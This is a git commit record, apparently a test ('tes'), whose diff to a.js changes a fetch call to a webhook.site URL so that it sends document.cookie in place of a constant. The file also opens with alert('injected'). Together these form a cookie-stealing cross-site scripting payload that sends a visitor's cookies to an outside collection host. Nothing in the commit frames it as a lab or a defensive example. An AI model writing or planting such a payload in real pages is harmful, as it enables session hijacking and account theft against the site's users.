2b4ea343a0697cf36601ca365eb84e2842298d42
HerLove12 <95884923+HerLove12@users.noreply.github.com>
2024-04-02 15:23:00 +0200

    tes

--- a.js
+++ a.js
@@ -1,6 +1,6 @@
 alert("injected");
 
-fetch("https://webhook.site/cc7513f7-4334-4f13-9bee-aab38c8a9ece?x="+2, {
+fetch("https://webhook.site/cc7513f7-4334-4f13-9bee-aab38c8a9ece?x="+document.cookie, {
   method: "GET",
 })
 .then(response => {
